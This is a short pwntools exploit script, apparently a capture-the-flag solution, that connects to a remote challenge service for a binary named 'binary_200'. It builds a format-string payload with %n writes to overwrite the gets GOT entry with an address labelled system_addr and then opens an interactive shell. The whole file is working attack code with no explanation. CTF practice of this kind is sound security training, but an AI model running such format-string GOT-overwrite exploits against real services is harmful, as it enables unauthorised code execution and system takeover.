from pwn import *

DEBUG = False 

if DEBUG:
    p = process("binary_200")
else:
    p = remote("bamboofox.cs.nctu.edu.tw", 22002)


system_addr = 0x0804854d
gets_got = 0x804a010

payload  = p32(gets_got)
payload += p32(gets_got + 0x2)
payload += "%" + str(0x854d - 0x4 * 2) + "x"
payload += "%5$n"
payload += "%" + str(0x10804 - 0x854d) + "x"
payload += "%6$n"

p.sendline(payload)
p.recv()
p.sendline(payload)

p.interactive()
p.close()
